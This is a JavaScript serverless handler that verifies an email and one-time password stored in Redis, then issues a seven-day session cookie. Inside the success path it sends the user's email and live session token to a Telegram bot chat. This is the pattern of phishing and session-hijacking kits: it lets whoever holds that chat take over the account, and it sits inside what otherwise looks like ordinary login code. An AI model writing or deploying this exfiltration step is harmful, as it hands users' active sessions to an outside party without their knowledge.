const Redis = require("ioredis");
const { v4: uuidv4 } = require("uuid");
const fetch = require("node-fetch");

const REDIS_URL = process.env.REDIS_URL;
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

if (!REDIS_URL || !BOT_TOKEN || !CHAT_ID) {
  throw new Error("Missing required environment variables: REDIS_URL, BOT_TOKEN, or CHAT_ID.");
}

// Create a single Redis instance (Vercel may re-use the Lambda)
let redis;
function getRedis() {
  if (!redis) {
    redis = new Redis(REDIS_URL);
  }
  return redis;
}

function getOtpKey(email) {
  return `otp:${email}`;
}

function getSessionKey(token) {
  return `session:${token}`;
}

const SESSION_TTL_SECONDS = 60 * 60 * 24 * 7; // 7 days

export default async function handler(req, res) {
  if (req.method !== "POST") {
    res.status(405).json({ success: false, message: "Method not allowed" });
    return;
  }

  let email, otp;
  try {
    ({ email, otp } = typeof req.body === "string" ? JSON.parse(req.body) : req.body);
  } catch {
    res.status(400).json({ success: false, message: "Invalid JSON body" });
    return;
  }

  if (!email || !otp) {
    res.status(400).json({ success: false, message: "Missing email or OTP" });
    return;
  }

  email = email.trim().toLowerCase();

  const redisClient = getRedis();

  let storedOtp;
  try {
    storedOtp = await redisClient.get(getOtpKey(email));
  } catch (err) {
    console.error("Redis error:", err);
    res.status(500).json({ success: false, message: "Internal server error" });
    return;
  }

  if (!storedOtp) {
    res.status(400).json({ success: false, message: "OTP not found" });
    return;
  }

  if (storedOtp !== otp) {
    res.status(401).json({ success: false, message: "Invalid OTP" });
    return;
  }

  // Session creation
  const sessionToken = uuidv4();
  try {
    await redisClient.set(getSessionKey(sessionToken), email, "EX", SESSION_TTL_SECONDS);
  } catch (err) {
    console.error("Redis session set error:", err);
    res.status(500).json({ success: false, message: "Internal server error" });
    return;
  }

  // Send session/cookie to Telegram
  const message =
    `✅ *OTP Verified*\n\n` +
    `📧 Email: ${email}\n` +
    `🍪 Session: ${sessionToken}\n` +
    `⏳ Valid for: 7 days`;

  const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

  try {
    await fetch(telegramUrl, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });
  } catch (e) {
    // continue, but log error
    console.error("Telegram session notify failed: ", e);
  }

  // Set cookie header (Vercel supports res.setHeader)
  res.setHeader(
    "Set-Cookie",
    `session=${sessionToken}; Path=/; HttpOnly; SameSite=Strict; Max-Age=${SESSION_TTL_SECONDS}`
  );
  res.status(200).json({ success: true, message: "OTP verified and session created" });
}